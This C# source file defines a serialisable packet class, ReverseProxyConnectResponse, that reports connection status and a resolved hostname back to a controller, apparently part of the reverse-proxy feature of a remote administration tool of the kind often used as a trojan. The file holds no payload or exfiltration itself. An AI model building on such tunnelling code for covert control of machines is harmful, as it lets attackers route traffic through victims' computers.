using ProtoBuf;
using System;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxyConnectResponse : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        [ProtoMember(2)]
        public bool IsConnected { get; set; }

        [ProtoMember(3)]
        public long LocalEndPoint { get; set; }

        [ProtoMember(4)]
        public int LocalPort { get; set; }

        [ProtoMember(5)]
        public string HostName { get; set; }

        public ReverseProxyConnectResponse()
        {
        }

        public ReverseProxyConnectResponse(int connectionId, bool isConnected, long localEndPoint, int localPort, string TargetServer)
        {
            this.ConnectionId = connectionId;
            this.IsConnected = isConnected;
            this.LocalEndPoint = localEndPoint;
            this.LocalPort = localPort;
            this.HostName = "";

            if (isConnected)
            {
                try
                {
                    //resolve the HostName of the Server
                    System.Net.IPHostEntry entry = System.Net.Dns.GetHostEntry(TargetServer);
                    if (entry != null && !String.IsNullOrEmpty(entry.HostName))
                    {
                        HostName = entry.HostName;
                    }
                }
                catch { HostName = ""; }
            }
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
